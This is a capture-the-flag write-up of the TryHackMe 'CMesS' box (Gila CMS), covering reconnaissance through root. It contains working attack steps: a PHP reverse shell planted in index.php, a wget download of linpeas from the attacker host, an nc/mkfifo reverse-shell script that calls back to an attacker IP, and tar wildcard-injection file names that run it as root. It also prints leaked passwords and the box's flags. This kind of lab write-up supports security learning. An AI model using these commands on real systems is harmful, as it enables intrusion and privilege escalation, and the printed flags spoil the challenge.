<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/38aadcea-c3e0-48d7-b8ae-4f2f140dc398"><br>
June 16, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>406</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
Can you root this Gila CMS box? Click <a href=""</a> here to access this challenge.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/f49dc633-3ceb-4b0d-8219-09094a541620"></p>


<h2> Task 1 . Flags</h2>

```bash
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
...
```

```bash
dirsearch -u http://10.10.31.7 --exclude-status=401,402,403,404 > dirsearch__
...
[01:42:39] Starting: 
[01:42:45] 200 -    1KB - /0
[01:42:45] 200 -    2KB - /01
[01:42:45] 200 -    2KB - /1.htpasswd
[01:42:45] 200 -    2KB - /1.htaccess
[01:42:45] 200 -    2KB - /1.php
[01:42:45] 200 -    2KB - /1.tar.gz
[01:42:45] 200 -    2KB - /1
[01:42:45] 200 -    2KB - /1.rar
[01:42:45] 200 -    2KB - /1.tar
[01:42:45] 200 -    2KB - /1.txt
[01:42:45] 200 -    2KB - /1.tar.bz2
[01:42:45] 200 -    2KB - /1.zip
[01:42:45] 200 -    2KB - /1.sql
[01:42:45] 200 -    2KB - /1admin
[01:42:45] 200 -    2KB - /1c/
[01:42:45] 200 -    2KB - /1x1
[01:42:47] 200 -    1KB - /About
[01:42:47] 200 -    1KB - /about
[01:42:49] 200 -  697B  - /admin
[01:42:49] 200 -  697B  - /admin/%3bindex/
[01:42:49] 200 -  697B  - /admin/.config
[01:42:49] 200 -  697B  - /admin/
[01:42:50] 200 -  697B  - /admin/_logs/access-log
[01:42:50] 200 -  697B  - /admin/_logs/error.log
[01:42:50] 200 -  697B  - /admin/_logs/error_log
[01:42:49] 200 -  697B  - /admin/.htaccess
[01:42:50] 200 -  697B  - /admin/access.log
[01:42:49] 200 -  697B  - /admin/_logs/err.log
[01:42:50] 200 -  697B  - /admin/_logs/login.txt
[01:42:50] 200 -  697B  - /admin/access_log
[01:42:50] 200 -  697B  - /admin/_logs/error-log
[01:42:50] 200 -  697B  - /admin/account.jsp
[01:42:50] 200 -  697B  - /admin/admin
[01:42:49] 200 -  697B  - /admin/_logs/access_log
[01:42:50] 200 -  697B  - /admin/admin-login
[01:42:50] 200 -  697B  - /admin/admin-login.aspx
[01:42:50] 200 -  697B  - /admin/access.txt
[01:42:50] 200 -  697B  - /admin/admin-login.html
[01:42:50] 200 -  697B  - /admin/admin-login.js
[01:42:50] 200 -  697B  - /admin/admin.aspx
[01:42:50] 200 -  697B  - /admin/account.aspx
[01:42:50] 200 -  697B  - /admin/account.php
[01:42:50] 200 -  697B  - /admin/admin_login.aspx
[01:42:50] 200 -  697B  - /admin/admin.php
[01:42:50] 200 -  697B  - /admin/admin-login.php
[01:42:50] 200 -  697B  - /admin/admin.html
[01:42:50] 200 -  697B  - /admin/account.html
[01:42:50] 200 -  697B  - /admin/admin_login
[01:42:50] 200 -  697B  - /admin/account
[01:42:50] 200 -  697B  - /admin/admin.jsp
[01:42:50] 200 -  697B  - /admin/account.js
[01:42:50] 200 -  697B  - /admin/admin.js
[01:42:50] 200 -  697B  - /admin/_logs/access.log

```


<p><code>TargetIP</code> <code>cmess.thm dev.cmess.thm</code></p>

```bash
# wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm' -H 'Host: FUZZ.cmess.thm' --hw 290
...
===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                             
===================================================================

000000019:   200        30 L     104 W    934 Ch      "dev"                                                                                                               
...
```

```bash
# curl http://cmess.thm/robots.txt
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

<p><code>andre@cmess.thm</code> : <code>KPFTN_f2yxe%</code> in <code>admin panel</code></p>

![image](https://github.com/user-attachments/assets/b382a2ba-7871-454e-bbb3-02813a6b480d)


```bash
pip install html2text
...
 curl -s dev.cmess.thm | html2text
## Development Log

### andre@cmess.thm

Have you guys fixed the bug that was found on live?

### support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're
hoping to patch it in the upcoming patch!

### support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances

### andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be
unable to get onto the admin panel.

### support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```


<p><code>root</code> : <code>r0otus3rpassw0rd'</code></p>

```bash
<?php

$GLOBALS['config'] = array (
  'db' => 
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  'permissions' => 
  array (
    1 => 
    array (
      0 => 'admin',
      1 => 'admin_user',
      2 => 'admin_userrole',
    ),
  ),
  'packages' => 
  array (
    0 => 'blog',
  ),
  'base' => 'http://cmess.thm/gila/',
  'theme' => 'gila-blog',
  'title' => 'Gila CMS',
  'slogan' => 'An awesome website!',
  'default-controller' => 'blog',
  'timezone' => 'America/Mexico_City',
  'ssl' => '',
  'env' => 'pro',
  'check4updates' => 1,
  'language' => 'en',
  'admin_email' => 'andre@cmess.thm',
  'rewrite' => true,
);
```

!<p>PentestMonkey Reverse Shell replacing <code>index.php</code> content.</p>

![image](https://github.com/user-attachments/assets/a6721992-992b-4aa0-ad48-9a5edcc5e3bb)

<p>http://cmess.thm/index.php</p>


```bash
~/CMesS# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.31.7 47738
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 18:31:51 up  1:06,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cmess:/$ ^Z
[2]+  Stopped                 nc -nlvp 9001
~/CMesS# stty raw -echo; fg
nc -nlvp 9001

www-data@cmess:/$
```

```bash
~/CMesS# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
...
[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/var/www/html/config.php:  'admin_email' => 'andre@cmess.thm',
/var/www/html/src/core/install/install.form.php:	<input name="db_host" value="localhost" placeholder="Hostname" required>
/var/www/html/src/core/install/install.php:        $GLOBALS['config']['admin_email'] = $_POST['adm_email'];
/var/www/html/src/core/install/install.php:    $host=$_POST['db_host'];$db_user=$_POST['db_user'];


[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/var/www/html/src/blog/controllers/blog.php:      $res = $db->query("SELECT username FROM user WHERE id='$user_id';");
/var/www/html/src/blog/controllers/blog.php:    $res = $db->get("SELECT username,id from user WHERE id=? OR username=?",[$user_id,$user_id]);
/var/www/html/src/core/classes/session.php:    if (isset($_POST['username']) && isset($_POST['password']) && session::waitForLogin()==0) {
/var/www/html/src/core/models/post.php:      (SELECT username FROM user WHERE post.user_id=id) as author
/var/www/html/src/core/models/user.php:    return $db->query("UPDATE user SET username=? where id=?;",[$name,$id]);
/var/www/html/src/core/tables/user-post.php:      'qoptions'=>"SELECT id, username FROM user","edit"=>false
/var/www/html/src/core/tables/user.php:    'username'=> [
/var/www/html/src/core/views/admin/myprofile.php:    <input name="gila_username" value="<?=session::key('user_name')?>" class="gm-3" />
...
```

```bash
www-data@cmess:/tmp$ wget http://10.10.168.117:8000/linpeas.sh
```

```bash
www-data@cmess:/var/www/html$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 120242
Server version: 5.7.29-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gila               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use gila;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_gila |
+----------------+
| option         |
| page           |
| post           |
| postcategory   |
| postmeta       |
| user           |
| usermeta       |
| userrole       |
| widget         |
+----------------+
9 rows in set (0.00 sec)

mysql> select * from user;
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
| id | username | email           | pass                                                         | active | reset_code | created             | updated             |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |            | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql> 
```


```bash
www-data@cmess:/$ cd opt
www-data@cmess:/opt$ ls
www-data@cmess:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 22 root root 4096 Feb  6  2020 ..
-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
www-data@cmess:/opt$ cat .password.bak
andres backup password
UQfsdCB7aAP6
www-data@cmess:/opt$ 
```

```bash
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
andre@cmess:~$
```

```bash
andre@cmess:~$ cd backup
andre@cmess:~/backup$ ls
note
andre@cmess:~/backup$ cat note
Note to self.
Anything in here will be backed up! 
andre@cmess:~/backup$ 
```


```bash
andre@cmess:~/backup$ cat > /home/andre/backup/rev << EOF
> #!/bin/bash
> rm /tmp/f
> mkfifo /tmp/f
> cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.168.117 1337 >/tmp/f
> EOF
```

```bash
~/CMesS# nc -nlvp 1337
Listening on 0.0.0.0 1337
```


```bash
andre@cmess:~/backup$echo "" > "/home/andre/backup/--checkpoint=1"
echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
```


```bash
~/CMesS# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.31.7 58726
/bin/sh: 0: can't access tty; job control turned off
# ls /root
root.txt
# cat /root/root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
# 
```

![image](https://github.com/user-attachments/assets/c0058d55-6be1-485f-b518-034660b05013)

<br>
<br>

![image](https://github.com/user-attachments/assets/34b06b90-6271-4471-8fca-4c7f75997dfa)

![image](https://github.com/user-attachments/assets/dba42b10-5b88-499a-be07-928000fc46e1)

<br>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 16 2025      | 406      |     201st    |      5ᵗʰ     |     355ᵗʰ   |     8ᵗʰ    |  108,303 |    782    |     63    |

</div>

![image](https://github.com/user-attachments/assets/70159f55-d51f-4903-ae66-60c2e1c49c21)


![image](https://github.com/user-attachments/assets/8a17443f-4ee3-41a6-98a3-dae86cd366da)

![image](https://github.com/user-attachments/assets/08151751-d027-483b-96cb-7ffe407784f6)

![image](https://github.com/user-attachments/assets/b3649c89-0c1e-4e12-a694-388f61c30e20)


![image](https://github.com/user-attachments/assets/6a960ad9-908d-4b44-8082-152f268364a0)




